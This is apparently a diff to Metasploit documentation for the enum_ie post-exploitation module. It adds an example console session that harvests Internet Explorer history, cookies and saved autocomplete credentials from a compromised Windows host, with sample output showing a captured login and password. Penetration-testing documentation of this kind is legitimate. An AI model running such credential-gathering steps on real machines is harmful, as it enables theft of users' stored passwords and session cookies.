@@ -26,7 +26,9 @@
 
 ## Example Scenario
 
-  **Using an existing meterpreter session**
+  **Using the module with an earlier version than IE7 (IE6)**
+
+  In this scenario the module won't be able to extract credential data.
 
   ```
   msf exploit(handler) > use post/windows/gather/enum_ie
@@ -50,7 +52,44 @@
   [*] Post module execution completed
   ```
 
-  The extracted history data would then for example look like this:
+  **Using the module with IE7+ (IE8)**
+
+  In this scenario the module will try to extract credential data, display it in the console and save it in a loot file.
+
+  ```
+  msf exploit(handler) > use post/windows/gather/enum_ie
+  msf post(enum_ie) > set SESSION 1
+  SESSION => 1
+  msf post(enum_ie) > run
+
+  [*] IE Version: 8.0.7601.17514
+  [*] Retrieving history.....
+          File: C:\Users\IEUser\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat
+          File: C:\Users\IEUser\AppData\Local\Microsoft\Windows\History\Low\History.IE5\index.dat
+  [*] Retrieving cookies.....
+          File: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Cookies\index.dat
+          File: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Cookies\Low\index.dat
+  [*] Looping through history to find autocomplete data....
+  [*] Looking in the Credential Store for HTTP Authentication Creds...
+  [*] Writing history to loot...
+  [*] Data saved in: /home/user/.msf4/loot/20161031201908_default_10.0.2.15_ie.history_555694.txt
+  [*] Writing cookies to loot...
+  [*] Data saved in: /home/user/.msf4/loot/20161031201908_default_10.0.2.15_ie.cookies_216987.txt
+  [*] Writing gathered credentials to loot...
+  [*] Data saved in: /home/user/.msf4/loot/20161031201908_default_10.0.2.15_ie.user.creds_355504.txt
+
+  Credential data
+  ===============
+
+   Type           Url                                     User           Pass
+   ----           ---                                     ----           ----
+   Auto Complete  https://wordpresssite.net/wp-login.php  sampleUser     P455w0rd
+   Auto Complete  https://wordpresssite.net/wp-login.php  sampleUser     P455w0rd
+
+  [*] Post module execution completed
+  ```
+
+  The extracted history data would in both scenarios for example look like this:
 
   ```
   History data
